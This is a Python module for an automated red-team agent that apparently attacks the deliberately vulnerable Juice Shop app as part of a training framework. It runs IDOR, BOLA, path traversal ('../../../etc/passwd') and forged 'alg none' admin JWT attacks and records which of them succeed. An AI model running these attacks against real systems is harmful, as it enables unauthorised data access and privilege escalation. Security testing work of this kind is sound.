from typing import List, Dict, Any, Optional
from datetime import datetime
from uuid import UUID
import structlog
import httpx
import json

from agents.schemas import EpisodeContext, RedTeamAction, EpisodeState
from agents.rag.memory import RAGMemory

logger = structlog.get_logger(__name__)


IDOR_TECHNIQUES = [
    {
        "technique_id": "T1548.003",
        "name": "Horizontal IDOR",
        "owasp_category": "A01",
        "attack_type": "horizontal_idor",
        "endpoints": [
            "/api/users/{id}",
            "/api/orders/{id}",
            "/api/profile/{id}",
            "/rest/user/{id}",
            "/api/v1/users/{id}",
        ],
        "payload_template": {"id": "{{target_id}}"},
        "description": "Access another user's resources by manipulating object IDs",
    },
    {
        "technique_id": "T1548.002",
        "name": "Vertical IDOR / Privilege Escalation",
        "owasp_category": "A01",
        "attack_type": "vertical_idor",
        "endpoints": [
            "/api/admin/users",
            "/api/admin/dashboard",
            "/api/management/reports",
            "/rest/admin/stats",
        ],
        "payload_template": {},
        "description": "Access admin functionality by bypassing authorization checks",
    },
    {
        "technique_id": "T1556.002",
        "name": "JWT Manipulation",
        "owasp_category": "A07",
        "attack_type": "jwt_manipulation",
        "endpoints": [
            "/api/users/{id}",
            "/api/profile",
            "/rest/user/me",
        ],
        "payload_template": {"token": "{{manipulated_jwt}}"},
        "description": "Modify JWT claims to escalate privileges or impersonate users",
    },
    {
        "technique_id": "T1083",
        "name": "Parameter Tampering / Path Traversal",
        "owasp_category": "A01",
        "attack_type": "parameter_tampering",
        "endpoints": [
            "/api/files/{path}",
            "/api/download?file={path}",
            "/rest/resource/{id}/file",
        ],
        "payload_template": {"path": "{{traversal_path}}"},
        "description": "Manipulate parameters to access unauthorized files or resources",
    },
    {
        "technique_id": "T1548.001",
        "name": "Broken Object Level Authorization (BOLA)",
        "owasp_category": "A01",
        "attack_type": "bola",
        "endpoints": [
            "/api/v1/objects/{id}",
            "/api/resources/{resource_id}",
            "/rest/items/{item_id}",
        ],
        "payload_template": {"resource_id": "{{other_user_resource_id}}"},
        "description": "Access objects without proper authorization validation",
    },
]


class RedTeamAgent:
    def __init__(
        self,
        rag_memory: Optional[RAGMemory] = None,
        scenario: str = "idor",
        target_type: str = "juice_shop",
    ):
        self.rag = rag_memory
        self.scenario = scenario
        self.target_type = target_type
        self.techniques = IDOR_TECHNIQUES
        self.technique_index = 0
        self.client = httpx.AsyncClient(timeout=30.0, follow_redirects=True)

    async def select_action(self, state: EpisodeContext) -> Optional[RedTeamAction]:
        if self.technique_index >= len(self.techniques):
            logger.info("All techniques exhausted", episode_id=str(state.episode_id))
            return None

        technique = self.techniques[self.technique_index]
        self.technique_index += 1

        rag_guidance = self._get_rag_guidance(state, technique)

        target_endpoint = self._select_endpoint(technique, state)
        payload = self._generate_payload(technique, state)

        action = RedTeamAction(
            technique_id=technique["technique_id"],
            owasp_category=technique["owasp_category"],
            attack_type=technique["attack_type"],
            target_endpoint=target_endpoint,
            http_method="GET",
            payload=payload,
            headers={"Content-Type": "application/json"},
            expected_behavior=technique["description"],
        )

        return action

    def _get_rag_guidance(self, state: EpisodeContext, technique: Dict[str, Any]) -> List[Dict[str, Any]]:
        if not self.rag:
            return []

        similar = self.rag.retrieve_by_technique(technique["technique_id"], n_results=2)
        return similar

    def _select_endpoint(self, technique: Dict[str, Any], state: EpisodeContext) -> str:
        endpoints = technique.get("endpoints", ["/api/users/1"])
        endpoint = endpoints[0]

        if "{{target_id}}" in endpoint:
            endpoint = endpoint.replace("{{target_id}}", "2")

        if "{{other_user_resource_id}}" in endpoint:
            endpoint = endpoint.replace("{{other_user_resource_id}}", "999")

        return f"{state.target_url.rstrip('/')}{endpoint}"

    def _generate_payload(self, technique: Dict[str, Any], state: EpisodeContext) -> Dict[str, Any]:
        template = technique.get("payload_template", {})

        payload = {}
        for key, value in template.items():
            if value == "{{target_id}}":
                payload[key] = 2
            elif value == "{{traversal_path}}":
                payload[key] = "../../../etc/passwd"
            elif value == "{{manipulated_jwt}}":
                payload[key] = self._generate_malicious_jwt()
            elif value == "{{other_user_resource_id}}":
                payload[key] = 999
            else:
                payload[key] = value

        return payload

    def _generate_malicious_jwt(self) -> str:
        import base64
        header = {"alg": "none", "typ": "JWT"}
        payload = {"sub": "2", "role": "admin", "exp": 9999999999}
        encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
        encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
        return f"{encoded_header}.{encoded_payload}."

    async def execute_action(self, action: RedTeamAction, target_url: str) -> Dict[str, Any]:
        try:
            full_url = action.target_endpoint
            if not full_url.startswith("http"):
                full_url = f"{target_url.rstrip('/')}{action.target_endpoint}"

            logger.info("Executing attack", url=full_url, technique=action.technique_id)

            if action.http_method == "GET":
                response = await self.client.get(full_url, params=action.payload, headers=action.headers)
            elif action.http_method == "POST":
                response = await self.client.post(full_url, json=action.payload, headers=action.headers)
            elif action.http_method == "PUT":
                response = await self.client.put(full_url, json=action.payload, headers=action.headers)
            elif action.http_method == "DELETE":
                response = await self.client.delete(full_url, headers=action.headers)
            else:
                response = await self.client.request(
                    action.http_method, full_url, json=action.payload, headers=action.headers
                )

            success = response.status_code in [200, 201, 204]
            is_idor = success and response.status_code == 200

            result = {
                "success": is_idor,
                "status_code": response.status_code,
                "response_body": response.text[:2000] if response.text else "",
                "response_headers": dict(response.headers),
                "technique_id": action.technique_id,
                "attack_type": action.attack_type,
                "timestamp": datetime.utcnow().isoformat(),
            }

            if success:
                logger.info("Attack successful", technique=action.technique_id, status=response.status_code)
            else:
                logger.info("Attack failed", technique=action.technique_id, status=response.status_code)

            return result

        except httpx.TimeoutException:
            return {"success": False, "error": "Timeout", "technique_id": action.technique_id}
        except httpx.ConnectError:
            return {"success": False, "error": "Connection failed", "technique_id": action.technique_id}
        except Exception as e:
            logger.error("Attack execution error", technique=action.technique_id, error=str(e))
            return {"success": False, "error": str(e), "technique_id": action.technique_id}

    async def close(self):
        await self.client.aclose()